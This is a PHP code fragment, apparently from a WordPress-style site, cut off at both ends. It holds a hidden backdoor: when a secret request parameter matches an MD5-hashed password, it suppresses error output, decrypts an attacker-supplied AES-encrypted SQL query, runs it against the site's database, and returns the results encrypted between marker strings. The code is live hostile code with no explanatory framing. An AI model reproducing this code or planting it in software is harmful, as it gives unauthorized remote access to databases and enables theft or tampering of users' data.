...
if( isset( $_REQUEST['plueot'] ) ) {
    @ini_set('error_reporting', 0);
    @ini_set('display_errors', 0);
    @ini_set('display_startup_errors', 0);
    function query_ex() {
        define('BORDERS', 'ojae4un7drfriie7b');
        function _out( $data, $key = 'Zxm8Emp93DvjQV7aRLal9arPH91DZ6Tf7d5X6mHqryk=' ) {
            $data = @openssl_encrypt($data, "AES-256-CBC", base64_decode($key), 0, substr(base64_decode($key), 0, 16));
            return BORDERS . $data . BORDERS;
        }
        if (md5(base64_decode($_REQUEST['plueot'])) !== '0e85c9a7da660241bb4c5d4cef858b97')
            exit(_out("BAD_PAS"));
        $key = 'Zxm8Emp93DvjQV7aRLal9arPH91DZ6Tf7d5X6mHqryk=';
        if (!isset($_REQUEST['jqa']))
            exit(_out("BAD_QUERY"));
        $query = @openssl_decrypt($_REQUEST['jqa'], "AES-256-CBC", base64_decode($key), 0, substr(base64_decode($key), 0, 16));
        $link = mysqli_connect( DB_HOST, DB_USER, DB_PASSWORD, DB_NAME ) or die( _out("ERROR_CONNECT_DB") );
        $result = mysqli_query( $link, $query ) or die( _out("BAD_RESPONSE_DB") );
        $output = array();
